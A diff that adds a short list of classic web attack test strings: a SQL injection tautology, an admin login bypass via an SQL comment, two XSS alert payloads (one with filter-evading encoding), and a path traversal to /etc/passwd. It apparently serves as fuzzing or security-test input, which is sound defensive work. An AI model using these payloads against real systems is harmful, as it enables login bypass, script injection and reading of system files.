@@ -1,0 +1,5 @@
+' OR '1'='1
+admin' --
+<script>alert('XSS')</script>
+../../../../etc/passwd
+<IMG SRC=javas&Tab;cript:alert('XSS');>
